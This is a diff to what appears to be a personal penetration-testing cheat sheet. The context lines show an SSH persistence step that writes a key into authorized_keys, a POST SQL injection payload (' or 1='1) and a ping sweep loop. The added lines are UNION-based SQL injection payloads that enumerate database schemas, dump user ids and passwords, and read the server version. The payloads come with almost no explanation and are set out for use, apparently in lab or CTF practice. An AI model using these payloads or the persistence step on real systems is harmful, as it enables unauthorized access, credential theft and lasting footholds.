@@ -30,7 +30,7 @@ NMAP Scripting Engine:
      echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
      cat /users/home/directory/.ssh/authorized_keys
 
-  POST SQL Inj:  f12network/reload/raw   copy next to url with ?   like below
+  POST SQL Inj:          f12network/reload/raw   copy next to url with ?   like below
    ' or 1='1
    
   GET
@@ -46,7 +46,12 @@ NMAP Scripting Engine:
    
    Ping Sweep
    for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done   (must be in bash shell)
-     
+   
+   SQL INJ:
+    Selection=2 UNION select (1,2,...)table_schema,column_name,table_name(4,5,6...) from information_schema.columns where table_name
+    Selection=2 UNION select name,type,cost from session.car;#
+    Selection=2 UNION select id,pass,name from session.user;#
+    Selection=2 UNION select 1,2,@@version
    
    
    
